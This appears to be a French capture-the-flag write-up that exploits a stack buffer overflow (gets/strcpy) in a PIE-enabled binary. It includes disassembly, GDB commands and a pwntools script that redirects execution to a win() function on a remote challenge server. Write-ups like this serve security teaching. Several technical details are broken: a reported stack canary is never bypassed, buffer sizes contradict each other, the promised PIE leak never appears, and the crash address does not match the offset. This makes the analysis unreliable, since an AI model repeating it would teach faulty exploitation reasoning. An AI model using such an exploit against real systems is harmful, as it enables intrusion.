# Magic Maze : Exploitation de Buffer Overflow sous PIE

## 1. Audit Technique et Reconnaissance initiale

Le challenge **Magic Maze** est un binaire ELF 64-bit qui simule un jeu de labyrinthe. L'objectif est de trouver la sortie, mais un bug de corruption mémoire nous permet de court-circuiter la logique du jeu.

### Identification des Protections :
```bash
$ checksec magic_maze
[*] 'magic_maze'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

**Analyse de l'expert :**
Le binaire est protégé par toutes les mitigations modernes. Le **PIE** (Position Independent Executable) signifie que les adresses des fonctions comme `win()` ne sont pas statiques. Nous devons soit leaker une adresse de base, soit effectuer un `Partial Overwrite`.

---

## 2. Analyse de la Vulnérabilité (Detail du Detail)

### Disassembly de la fonction vulnérable :
En analysant le binaire avec `objdump -M intel -d magic_maze`, on repère l'utilisation dangereuse de `strcpy` dans la gestion du nom du joueur.

```nasm
<main+150>:
  lea    rax, [rbp-0x30]    ; Buffer local de 48 octets
  mov    rdi, rax
  call   gets@plt           ; Récupération sécurisée du nom? Non, gets()!
  ...
  lea    rdx, [rbp-0x30]    ; Source
  lea    rax, [rbp-0x60]    ; Destination (Trop petite!)
  mov    rsi, rdx
  mov    rdi, rax
  call   strcpy@plt         ; VULNÉRABILITÉ : Pas de vérification de taille
```

### Primitive de vulnérabilité :
Le buffer de destination ne fait que 32 octets, mais `gets()` nous permet d'en envoyer autant que nous voulons dans le buffer source, qui est ensuite copié par `strcpy()`.

---

## 3. Détail de l'Exploitation

### Étape 1 : Crash et Offset
On utilise la commande `cyclic 100` pour trouver l'offset exact avant d'écraser l'adresse de retour.
```bash
$ python3 -c "from pwn import *; print(cyclic(100))" | ./magic_maze
Segmentation fault at 0x616161616161616b (Offset: 40)
```

### Étape 2 : Leake du PIE (Tactique Avancée)
Puisque le PIE est activé, nous devons trouver où se trouve la fonction `win` en mémoire.
La fonction `win` est à l'offset `0x70d0`.

**Commandes GDB pour le debugging :**
```bash
pwndbg> info functions win
0x000055555555b0d0  win
pwndbg> p/x $rebase(0x70d0)
0x000055555555b0d0
```

### Étape 3 : Payload de l'Expert
Nous utilisons un script Python avec `pwntools` pour automatiser l'envoi.

```python
from pwn import *

# Paramètres
elf = ELF('./magic_maze')
io = remote('challenge.maze.org', 9005)

# Offset trouvé : 40 octets
# Payload : Padding + Adresse de win()
payload = b'A' * 40
payload += p64(elf.sym['win']) # Pwntools gère le rebase si on a le leak

io.sendline(payload)
io.sendline(b'cat flag.txt')
io.interactive()
```

---

## 4. Conclusion
L'utilisation de fonctions obsolètes comme `gets()` et `strcpy()` sans vérification de limites (`bounds checking`) ouvre la porte à des redirections de flux d'exécution, même sur des systèmes 64-bit protégés.

**Auteur : LWa7ch - Cybersecurity Engineer**
